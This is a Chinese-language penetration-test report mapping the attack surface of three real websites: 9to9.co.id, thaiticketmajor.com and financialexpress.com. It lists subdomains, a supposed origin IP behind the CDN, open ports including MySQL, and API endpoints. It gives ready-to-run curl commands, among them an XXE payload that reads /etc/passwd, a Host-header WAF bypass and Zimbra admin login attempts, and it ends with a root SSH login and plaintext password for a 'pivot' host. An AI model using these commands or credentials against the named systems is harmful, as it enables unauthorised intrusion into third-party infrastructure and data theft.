# 渗透测试报告 - 攻击面

## 目标资产

### 9to9.co.id
- oms.9to9.co.id → 192.46.224.142 (真实IP: 172.104.189.60)
- seller.9to9.co.id → 192.46.224.142
- affiliate.9to9.co.id → 192.46.224.142
- www.9to9.co.id → 192.46.224.142

### thaiticketmajor.com
- www.thaiticketmajor.com → 98.98.253.56
- staging.thaiticketmajor.com → 98.98.253.56
- payment.thaiticketmajor.com → 98.98.253.56
- shopping.thaiticketmajor.com → 98.98.253.56
- event.thaiticketmajor.com → 98.98.253.56
- mail.thaiticketmajor.com → 103.28.36.108

### financialexpress.com
- www.financialexpress.com → 23.207.42.133

---

## 开放端口

### 172.104.189.60
```
21/tcp    FTP       vsftpd 3.0.5
22/tcp    SSH       OpenSSH 9.6p1
80/tcp    HTTP      SWIFT
443/tcp   HTTPS     nginx
3306/tcp  MySQL     8.0.41-32
8080/tcp  HTTP      nginx
8443/tcp  HTTPS
9100/tcp  jetdirect
33060/tcp MySQLx
```

### 103.28.36.108
```
80/tcp   HTTP   LiteSpeed
443/tcp  HTTPS  LiteSpeed
```

---

## 攻击面

### GraphQL API
```
https://oms.9to9.co.id/graphql
https://seller.9to9.co.id/graphql
https://affiliate.9to9.co.id/graphql
```

**Mutations:**
```graphql
createCustomer(input: CustomerInput)
addNewVendorRequest(input: VendorRequestInput)
createAffiliateAccount(input: AffiliateAccountInput)
```

**Queries:**
```graphql
products(search: String, pageSize: Int)
storeConfig
```

---

### REST API
```
GET  /rest/V1/directory/countries
GET  /rest/V1/store/storeConfigs
POST /rest/V1/customers/me
GET  /rest/V1/products
POST /rest/V1/integration/admin/token
POST /rest/V1/guest-carts/
```

---

### 隐藏端点
```
/ping
/execute
/status
```

---

### 认证端点
```
POST /rest/V1/integration/admin/token
POST /service/soap (Zimbra)
```

---

### 技术栈

**9to9.co.id:**
```
Magento 2.3 Community
nginx
MySQL 8.0.41-32
Ubuntu
```

**thaiticketmajor.com:**
```
LiteSpeed
CloudWAF
Zimbra
```

**financialexpress.com:**
```
Akamai CDN
WordPress
```

---

## CDN/WAF

```
9to9.co.id          → Cloudflare
thaiticketmajor.com → CloudWAF
financialexpress.com → Akamai
```

**真实后端IP:**
```
172.104.189.60 (9to9.co.id)
```

---

## 数据库
```
MySQL:  172.104.189.60:3306
MySQLx: 172.104.189.60:33060
```

---

## 命令

### GraphQL
```bash
curl -sk https://oms.9to9.co.id/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ products(search:\"\",pageSize:100) { items { sku name price { regularPrice { amount { value } } } } } }"}'

curl -sk https://oms.9to9.co.id/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { createCustomer(input: {email:\"test@test.com\",firstname:\"Test\",lastname:\"User\",password:\"Test@123\"}) { customer { email } } }"}'

curl -sk https://oms.9to9.co.id/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { addNewVendorRequest(input: {email:\"vendor@test.com\",first_name:\"Test\",last_name:\"Vendor\",password:\"Test@123\",password_confirmation:\"Test@123\",company_name:\"TestCo\"}) { status } }"}'
```

### REST API
```bash
curl -sk https://oms.9to9.co.id/rest/V1/directory/countries
curl -sk https://oms.9to9.co.id/rest/V1/store/storeConfigs

curl -sk http://172.104.189.60/rest/V1/directory/countries -H "Host: oms.9to9.co.id"
```

### XXE
```bash
curl -sk "http://172.104.189.60/rest/V1/guest-carts/" -H "Host: oms.9to9.co.id" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### WAF绕过
```bash
curl -sk https://staging.thaiticketmajor.com/admin -H "Host: localhost"
```

### Zimbra SOAP
```bash
curl -sk https://mail.thaiticketmajor.com/service/soap \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0"?><soap:Envelope><soap:Body><AuthRequest><account>admin</account><password>test</password></AuthRequest></soap:Body></soap:Envelope>'
```

---

## Pivot
```bash
ssh -p 2233 root@82.29.71.156
密码: @admin1314@
```
